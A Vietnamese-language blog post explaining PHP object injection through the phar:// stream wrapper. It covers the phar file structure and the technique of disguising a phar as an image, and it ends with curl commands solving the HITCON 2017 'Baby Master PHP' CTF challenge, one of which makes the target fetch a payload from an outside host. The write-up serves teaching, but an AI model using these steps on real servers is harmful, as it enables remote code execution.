---
title: "Php Object Injection Without Unserialize"
date: 2018-09-20T09:17:11+07:00
draft: false
author: "Kev"
comments: true
tags: ["PHP", "Serialization"]
Archives: '2018'
autoThumbnailImage: false
thumbnailImagePosition: top
thumbnailImage: ''
coverImage: /images/uploads/phar_background.png
categories:
  - 1day
---

# Stream wrapper

Trong php có khái niệm gọi là stream wrapper, nói về các giao thức trong cách xử lý url, được sử dụng cùng với hàm filesystem  như fopen, copy, file_exists, filesize.

| file:// 		| http:// 		| ftp:// | php:// | zlib:// | data:// | glob:// | phar:// |
| ------------- |:-------------:| ------:|:------:|:-------:|:-------:|:-------:|:-------:|

```
A wrapper is additional code which tells the stream how to handle specific protocols/encodings.
```

# Phar 

Những wrapper này đều có thể lợi dụng để khai thác nhiều loại lỗ hổng. `Phar` wrapper là php archive. Dùng để nén tệp và siêu dữ liệu. Phar không thể sử dụng cho truy cập file từ xa.
Cấu trúc của phar gồm: stub, manifest, file content, signature.

{{<figure src="/images/uploads/phar_phar-structure.png">}}

__Stub__

`__HALT_COMPILER()` là hàm dừng thực thi code trong file php.
```
$ php -r "echo 'Test'; __HALT_COMPILER(); echo 'stub';"
> Test
>
```
`Stub` là một đoạn code php đơn giản. Sử dụng `__HALT_COMPILER` mô tả code php, vì không muốn chương trình biên dịch và thực thi đoạn code php phía sau.

__Manifest__

{{<figure src="/images/uploads/phar_manifest.png">}}

Các byte đầu mô tả thông tin của phar gồm các thông tin của file nén bên trong, version, ... Trong đó có đoạn byte gần cuối là định dạng của [serialize php](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/).
Vậy, bản chất trong phar đã có serialize và chắc một điều là sẽ có 1 giai đoạn nào đó phải sử dụng đến unserialize. Đó là lúc giải nén các file bên trong của tệp phar.

__File contents__

Chứa nội dung được nén bên trong

__Signature__

Phần chữ kí dùng để xác minh tính toàn vẹn của tệp phar, chỉ cần thay đổi 1 yếu tố trong tệp thì chữ kí này giúp để xác minh sự thay đổi đó.

{{<figure src="/images/uploads/phar_xxd-file-phar.png">}}

Chúng ta có thể thấy, phần stub ở trên đầu của file (`<?php __HALT_COMPILER(); ?>`), vì phần này mình có thể tự do tùy chỉnh nên giúp cho việc tạo định dạng file fake rất dễ. Tiếp theo là đoạn `O:7:"example":1:{...` là dữ liệu serialize, lợi dụng điểm này mình có thể override dữ liệu tạo ra payload tấn công object injection. `test.txt`  là nội dung file nén bên trong. Cuối cùng, là đoạn signature để xác minh tính toàn vẹn dữ liệu.


# Kịch bản tấn công

Thông thường nhiều trang web có tính năng upload ảnh và cho tự do chèn địa chỉ ảnh. Cách ngăn chặn những lỗi tấn công không biết trước thường mọi lập trình viên chỉ dùng function `file_exists()` để kiểm tra file. Nhưng đây lại là tác nhân gây ra lỗi object injection dùng phar.

 - _Bước 0_: Khởi tạo payload, cần biết trước trên server có những class nào đã được định nghĩa. Điều này về lý thuyết có vẻ khó, nhưng các ứng dụng lớn thông thường sử dụng những class phổ biến, cho nên có thể khảo sát qua nhiều sourcecode của các trang web lớn.
 - _Bước 1_: vì phar không thể tương tác file từ xa, chúng ta cần upload file payload lên server. Có thể dễ dàng qua mặt các filter bằng cách tạo file phar với stub là header file ảnh.
 - _Bước 2_: Cần tùy chỉnh được url trong các function: include(), fopen(), file_get_contents(), file(), ... Url dạng `phar:///usr/share/payload.phar.jpg`

# Capture The Flag ([orange.tw](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017))

__Baby^H Master PHP 2017 | HITCON 2017 Quals__

[source code index.php]({{/resources/php_obj_inj_without_unserialize/index.php}})

```
# Get a cookie
$ curl http://host/ --cookie-jar cookie

# Download .phar file from http://orange.tw/avatar.gif
$ curl -b cookie 'http://host/?m=upload&url=http://orange.tw/'

# Get flag
$ curl -b cookie "http://host/?m=upload&url=phar:///var/www/data/$MD5_IP/&lucky=%00lambda_1"
```
